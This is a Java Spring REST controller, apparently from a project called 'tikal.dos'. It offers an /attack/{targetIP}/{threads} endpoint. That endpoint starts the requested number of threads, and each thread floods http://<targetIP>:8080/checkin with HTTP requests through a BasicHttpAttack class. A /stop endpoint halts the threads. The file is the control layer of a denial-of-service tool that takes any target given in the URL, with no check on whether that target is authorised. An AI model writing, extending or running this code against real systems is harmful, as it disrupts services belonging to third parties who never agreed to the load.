package tikal.controller;

import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;
import tikal.dos.AtomicCounter;
import tikal.dos.Attack;
import tikal.dos.BasicHttpAttack;

import java.util.Date;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@RestController
public class DoSController {
	
	Set<Attack> ongoingAttacks = new HashSet<Attack>(); 

	ExecutorService execService = Executors.newCachedThreadPool();
	
	@RequestMapping(value="/attack/{targetIP}/{threads}",method=RequestMethod.GET)
	public Object start(@PathVariable final int threads, @PathVariable final String targetIP){
		System.out.println(threads);
		System.out.println(targetIP);
        AtomicCounter atomicCounter = new AtomicCounter();
        try {
			for (int i = 0; i < threads; i++) {
				Attack attack = new BasicHttpAttack(atomicCounter);
				attack.setUrl("http://"+targetIP+":8080/checkin");
				ongoingAttacks.add(attack);
				execService.execute(attack);
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
		
		return true;
	}
	
	@RequestMapping(value="/stop",method=RequestMethod.GET)
	public Object stop(){
		for (Attack attack : ongoingAttacks) {
			attack.stop();
		}
        System.out.println("Attack stopped");
		return true;
	}

    @RequestMapping(value = "/test", method = RequestMethod.GET)
    public String test() {
        return "Baruch Jamili " + new Date();
    }
}
